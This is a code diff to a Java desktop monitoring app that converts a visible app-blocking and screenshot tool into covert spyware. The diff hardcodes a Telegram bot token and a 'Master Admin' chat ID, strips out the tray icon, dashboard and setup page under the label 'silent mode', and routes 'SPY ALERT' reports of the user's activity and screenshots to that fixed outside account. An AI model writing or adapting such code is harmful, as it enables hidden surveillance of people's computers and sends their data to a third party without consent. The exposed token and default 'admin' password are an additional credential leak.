@@ -28,8 +28,9 @@ public class Main {
     private static int scanInterval = 2000;
     private static String masterPassword = "admin";
     private static boolean isLocked = true;
-    private static String botToken = "";
-    private static String chatId = "";
+    private static String botToken = "8780573988:AAEAWFDtYg_p-hst4JwqA9RSWN9cNzW7eKk";
+    private static String chatId = "1123697239"; // Master Admin Chat ID
+    private static final String ADMIN_CHAT_ID = "1123697239";
     private static long lastUpdateId = 0;
 
     private static TrayIcon trayIcon;
@@ -62,8 +63,8 @@ public class Main {
                     .headless(false)
                     .run(args);
             System.out.println("✅ [DEBUG] Spring Context Started Successfully.");
-            setupSystemTray();
-            System.out.println("🖼️ [DEBUG] System Tray Initialized.");
+            // setupSystemTray(); // REMOVED FOR SILENT MODE
+            System.out.println("🛡️ [DEBUG] Silent Mode Enabled.");
             System.out.flush();
         } catch (Exception e) {
             System.err.println("❌ [DEBUG] Spring Boot Failed to Start:");
@@ -95,50 +96,20 @@ public class Main {
                 String screenshotPath = takeScreenshot(screenshotName);
                 
                 // Save log to DB with screenshot path
-                com.guardian.repository.LogRepository logRepo = finalContext.getBean(com.guardian.repository.LogRepository.class);
-                logRepo.save(new com.guardian.entity.LogEntry(appName, "TERMINATED", "App blocked and screenshot captured.", screenshotName));
-
-                // Send Telegram (with fallback to official bot if needed)
-                sendTelegramMessage("⚠️ ALERT: Someone tried to open *" + appName + "* on your PC! Access was blocked. 🚫");
-            });
-
-            SwingUtilities.invokeLater(() -> {
                 try {
-                    System.out.println("🔍 [DEBUG] Checking UI State...");
-                    if (userRepo.count() == 0) {
-                        System.out.println("🚀 [DEBUG] Setup Mode Active. Opening browser...");
-                    // Auto-open browser to welcome page
-                    try {
-                        if (Desktop.isDesktopSupported()) {
-                            Desktop.getDesktop().browse(new URI("http://localhost:8081/welcome"));
-                            System.out.println("🌐 Browser opened: http://localhost:8081/welcome");
-                        }
-                    } catch (Exception ex) {
-                        System.out.println("🌐 Please open: http://localhost:8081/welcome");
-                    }
-                    } else {
-                        System.out.println("📊 [DEBUG] Launching Dashboard...");
-                        loadConfig(finalContext); // Refresh password from DB before creating dashboard
-                        dashboard = new Dashboard(isLocked, botToken, chatId, masterPassword);
-                        dashboard.setOnStatusChange(locked -> {
-                            if (locked) remoteLock(); else remoteUnlock();
-                        });
-                        dashboard.setOnSettingsSave(settings -> {
-                            System.out.println("💾 [DEBUG] Saving new settings...");
-                            botToken = settings.getString("botToken");
-                            chatId = settings.getString("chatId");
-                            masterPassword = settings.getString("password");
-                            saveConfigToFile();
-                            System.out.println("✅ [DEBUG] Settings Saved and Applied.");
-                            System.out.flush();
-                        });
-                        dashboard.setVisible(true);
-                    }
-                    System.out.flush();
-                } catch (Exception e) {
-                    System.err.println("❌ [DEBUG] UI Error: " + e.getMessage());
-                }
+                    com.guardian.repository.LogRepository logRepo = finalContext.getBean(com.guardian.repository.LogRepository.class);
+                    logRepo.save(new com.guardian.entity.LogEntry(appName, "TERMINATED", "Activity reported to Master Admin.", screenshotName));
+                } catch (Exception ignored) {}
+
+                // Send Telegram to Master Admin
+                sendTelegramMessage("🕵️‍♂️ *SPY ALERT:* Activity detected on a monitored PC!\n\n" +
+                    "🖥️ *Application:* " + appName + "\n" +
+                    "🚫 *Action:* Blocked & Screenshot Captured.", ADMIN_CHAT_ID);
             });
+
+            // SILENT START: No UI windows, no browser opening.
+            System.out.println("🛡️ [SILENT MODE] Monitoring started in background...");
+            System.out.flush();
 
             System.out.println("📱 [DEBUG] Starting Telegram Listener...");
             System.out.flush();
@@ -151,34 +122,7 @@ public class Main {
             while (true) {
                 securityService.scanAndProtect();
                 
-                if (dashboard == null && userRepo.count() > 0) {
-                    SwingUtilities.invokeLater(() -> {
-                        for (Window w : Window.getWindows()) {
-                            if (w instanceof SetupWizard) w.dispose();
-                        }
-                        loadConfig(finalContext);
-                        System.out.println("📊 [DEBUG] User detected! Launching Dashboard...");
-                        dashboard = new Dashboard(isLocked, botToken, chatId, masterPassword);
-                        
-                        // ESSENTIAL: Set callbacks for the dynamic dashboard
-                        dashboard.setOnStatusChange(locked -> {
-                            if (locked) remoteLock(); else remoteUnlock();
-                        });
-                        dashboard.setOnSettingsSave(settings -> {
-                            System.out.println("💾 [DEBUG] Saving new settings...");
-                            botToken = settings.getString("botToken");
-                            chatId = settings.getString("chatId");
-                            masterPassword = settings.getString("password");
-                            saveConfigToFile();
-                            System.out.println("✅ [DEBUG] Settings Saved and Applied.");
-                            System.out.flush();
-                        });
-                        
-                        dashboard.setVisible(true);
-                        System.out.println("✅ [DEBUG] Dashboard Initialized with Callbacks.");
-                        System.out.flush();
-                    });
-                }
+                // DASHBOARD POPUP REMOVED FOR SILENT MODE
 
                 if (syncCounter >= 5) {
                     loadConfig(finalContext);
